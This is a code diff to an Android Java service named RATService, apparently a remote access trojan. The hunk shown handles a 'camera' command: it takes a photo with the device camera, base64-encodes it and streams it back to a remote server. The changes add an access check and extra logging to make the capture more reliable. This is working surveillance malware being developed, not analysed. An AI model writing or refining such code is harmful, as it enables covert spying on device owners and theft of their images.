@@ -554,23 +554,30 @@ public class RATService extends Service {
                 break;
                 
             // CAMERA COMMANDS - FIXED: Removed duplicate case
-          case "camera":
+      case "camera":
 case "camera_photo":
     if (cameraModule != null) {
         Log.d(TAG, "📸 Taking photo with camera module");
+        
+        // First test if camera is accessible
+        cameraModule.testCameraAccess();
+        
         cameraModule.takePhoto(new CameraModule.CameraCallback() {
             @Override
             public void onPhotoTaken(String base64Image) {
-                Log.d(TAG, "📸 Photo taken, sending response, length: " + base64Image.length());
-                // Send directly without chunking for camera images
+                Log.d(TAG, "📸 Photo taken successfully, sending response, length: " + base64Image.length());
+                
+                // Force send without chunking
                 if (out != null) {
                     try {
                         out.println(base64Image);
                         out.flush();
-                        Log.d(TAG, "📸 Camera response sent");
+                        Log.d(TAG, "📸 Camera response sent to server");
                     } catch (Exception e) {
                         Log.e(TAG, "Error sending camera response", e);
                     }
+                } else {
+                    Log.e(TAG, "❌ Output stream is null, cannot send response");
                 }
             }
             
